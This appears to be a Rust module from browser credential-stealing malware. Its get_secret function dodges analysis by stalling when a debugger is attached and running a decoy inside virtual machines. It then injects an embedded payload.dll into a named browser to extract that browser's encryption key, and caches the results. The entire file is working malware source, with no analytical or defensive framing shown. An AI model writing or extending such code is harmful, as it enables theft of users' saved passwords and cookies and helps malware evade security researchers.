use std::{collections::HashMap, collections::HashSet, sync::Mutex};

use super::{env_configured, is_debugger_attached, is_virtualized_environment, run_sandbox_decoy};

const EMBEDDED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.dll"));

static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);

pub fn get_secret(browser_name: &str) -> Option<Vec<u8>> {
    if is_debugger_attached() {
        std::thread::sleep(std::time::Duration::from_secs(30));
        return None;
    }
    if is_virtualized_environment() {
        run_sandbox_decoy();
        return None;
    }
    if !env_configured() {
        return None;
    }

    if EMBEDDED_PAYLOAD.is_empty() {
        return None;
    }

    if let Ok(guard) = FAIL_CACHE.lock() {
        if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
            return None;
        }
    }
    if let Ok(guard) = KEY_CACHE.lock() {
        if let Some(map) = guard.as_ref() {
            if let Some(key) = map.get(browser_name) {
                return Some(key.clone());
            }
        }
    }

    let key = match inject::process_data(browser_name, EMBEDDED_PAYLOAD) {
        Some(k) => k,
        None => {
            if let Ok(mut guard) = FAIL_CACHE.lock() {
                if guard.is_none() {
                    *guard = Some(HashSet::new());
                }
                if let Some(set) = guard.as_mut() {
                    set.insert(browser_name.to_string());
                }
            }
            return None;
        }
    };

    if let Ok(mut guard) = KEY_CACHE.lock() {
        if guard.is_none() {
            *guard = Some(HashMap::new());
        }
        if let Some(map) = guard.as_mut() {
            map.insert(browser_name.to_string(), key.clone());
        }
    }

    Some(key)
}
